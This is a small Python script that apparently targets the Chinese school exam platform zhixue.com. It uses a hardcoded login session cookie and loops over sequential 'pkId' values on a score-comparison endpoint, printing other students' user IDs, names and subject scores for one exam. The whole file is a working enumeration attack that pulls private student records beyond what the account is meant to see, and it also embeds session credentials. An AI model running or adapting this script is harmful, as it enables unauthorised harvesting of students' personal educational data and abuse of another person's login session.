import requests,json


def search(testid):
    print(38470000+testid)
    num = 4444000020022890126 + testid
    headers = {
        'User-Agent':"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) "
                     "Chrome/65.0.3325.146 Safari/537.36",
        'Cookie':'JSESSIONID=0F17ED68E50B75BE745AD72324004A3D; loginUserName=38470061; gr_user_'
                 'id=16798ae3-e7b5-41a7-8d22-70eacfa861f1; '
                 'UM_distinctid=1627f693e90d0d-06e745707c7cba-3a61430c-144000-1627f693e911a7; '
                 'CNZZDATA1258631616=672263715-1522554713-http%253A%252F%252Fwww.zhixue.com%252F%7C1522554713; _'
                 '_DAYU_PP=n33NNQvqnbVyqQvbJNVi62e3c70cff6e; tlsysSessionId=d3a6b764-541f-4faa-b2f7-70ff2fd0d919;'
                 ' HEADER_ROLE_SID=0.31827040797863737; gr_session_id_98a7648283d407dd=10a56b1c-8075-4440-a61c-391c36735b46;'
                 ' Hm_lvt_29be5e7a29f87448fa6b5decb3e4e066=1522556026,1522559748; '
                 'Hm_lvt_71f0ed158f554118b01c2f97eac16263=1522556026,1522559748;'
                 ' Hm_lpvt_71f0ed158f554118b01c2f97eac16263=1522559781; Hm_lpvt_29be5e7a29f87448fa6b5decb3e4e066=1522559781'
    }
    response = requests.get('http://www.zhixue.com/zhixuebao/zhixuebao/personal/studentPkData/?'
                            'examId=f4bfc341-5a21-4c25-977b-f4c6a5a10d7d&pkId=%d' % num, headers=headers)
    html = response.text
    students = json.loads(html)
    student = students[1]
    grades = student['subjectList']
    userid = student['userId']
    print("userId",userid)
    try:
        name = student['name']
        print("name", name)
    except:
        print("不是好友")
    for grade in grades:
        subjectName = grade['subjectName']
        score = grade['score']
        print(subjectName,score)


for i in range(61,100):
    try:
        search(i)
    except:
        print("get %d fail" % (4444000020022890126+i))